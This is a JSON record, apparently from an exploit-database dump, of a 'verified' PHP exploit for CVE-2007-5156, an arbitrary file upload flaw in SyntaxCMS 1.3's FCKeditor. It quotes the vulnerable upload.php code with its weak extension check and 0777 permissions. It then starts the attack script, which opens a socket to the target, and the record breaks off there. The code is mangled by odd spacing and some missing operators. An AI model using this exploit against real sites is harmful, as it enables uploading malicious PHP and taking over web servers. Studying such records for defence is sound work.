{
    "text": "ecve : CVE-2007-5156 ， title : SyntaxCMS 1.3 - 'FCKeditor' Arbitrary File Upload - PHP webapps Exploit ， verified : Verified ， exploit_detail : <?php ， / *  ， Syntax CMS <= 1.3 ( fckeditor ) Arbitrary File Upload Exploit ， Gr33ts t0 : EgiX , ThE GeNeRal L0s3r , Houssamix , Str0ke <= => special THanks to EgiX For the Exploit Code ， author... : Stack ， mail..... : Ev ! L ， descr :  ， in the line :  ， \"POST { $ path}public/fckeditor/editor/filemanager/upload/php/upload.php ，  [ - ] vulnerable code in /public/fckeditor/editor/filemanager/upload/php/upload.php ， 41. // Get the posted file. ， 42. $ oFile = $ _FILES [ 'NewFile' ]  ;  ， 43. ， 44. // Get the uploaded file name and extension. ， 45. $ sFileName = $ oFile [ 'name' ]  ;  ， 46. $ sOriginalFileName = $ sFileName ;  ， 47. $ sExtension = substr (  $ sFileName ,  ( strrpos (  $ sFileName , '.' ) + 1 )  )  ;  ， 48. $ sExtension = strtolower (  $ sExtension )  ;  ， 49. ， 50. // The the file type ( from the QueryString , by default 'File' ) . ， 51. $ sType = isset (  $ _GET [ 'Type' ]  ) ? $ _GET [ 'Type' ]  : 'File' ;  ， 52. ， 53. // Check if it is an allowed type. ， 54. if (  ! in_array (  $ sType , array ( 'File' , 'Image' , 'Flash' , 'Media' )  )  )  ， 55. SendResults ( 1 , '' , '' , 'Invalid type specified' )  ;  ， 56. ， 57. // Get the allowed and denied extensions arrays. ， 58. $ arAllowed = $ Config [ 'AllowedExtensions' ]  [  $ sType ]  ;  ， 59. $ arDenied = $ Config [ 'DeniedExtensions' ]  [  $ sType ]  ;  ， 60. ， 61. // Check if it is an allowed extension. ， 62. if (  ( count (  $ arAllowed ) > 0 ! in_array (  $ sExtension ,  $ arAllowed )  )  |  |  ( count (  $ arDenied ) > 0 in_array (  $ sExtension ,  $ arDenied )  )  )  ， 63. SendResults ( '202' )  ;  ， 64. ， 65. $ sErrorNumber = '0' ;  ， 66. $ sFileUrl = '' ;  ， 67. ， 68. // Initializes the counter used to rename the file , if another one with the same name already exists. ， 69. $ iCounter = 0 ;  ， 70. ， 71. // The the target directory. ， 72. if ( isset (  $ Config [ 'UserFilesAbsolutePath' ]  )  )  ， 73. $ sServerDir = $ Config [ 'UserFilesAbsolutePath' ]  ;  ， 74. else ， 75. // $ sServerDir = GetRootPath (  ) . $ Config [ \"UserFilesPath\" ]  ;  ， 76. $ sServerDir = $ Config [ \"UserFilesPath\" ]  ;  ， 77. ， 78. while ( true )  ， 79. { ， 80. // Compose the file path. ， 81. $ sFilePath = $ sServerDir . $ sFileName ;  ， 82. ， 83. // If a file with that name already exists. ， 84. if ( is_file (  $ sFilePath )  )  ， 85. { ， 86. $ iCounter++ ;  ， 87. $ sFileName = RemoveExtension (  $ sOriginalFileName ) . ' ( ' . $ iCounter . ' ) .' . $ sExtension ;  ， 88. $ sErrorNumber = '201' ;  ， 89. } ， 90. else ， 91. { ， 92. move_uploaded_file (  $ oFile [ 'tmp_name' ]  ,  $ sFilePath )  ;  ， 93. ， 94. if ( is_file (  $ sFilePath )  )  ， 95. { ， 96. $ oldumask = umask ( 0 )  ;  ， 97. chmod (  $ sFilePath , 0777 )  ;  ， 98. umask (  $ oldumask )  ;  ， 99. } ， 100. ， 101. $ sFileUrl = $ Config [ \"UserFilesPath\" ] . $ sFileName ;  ， 102. ， 103. break ;  ， with a default configuration of this script , an attacker might be able to upload arbitrary files containing malicious PHP code ，  * / ， error_reporting ( 0 )  ;  ， set_time_limit ( 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ，  $ sock = fsockopen (  $ host , 80 )  ; ",
    "time": "2008-05-29"
}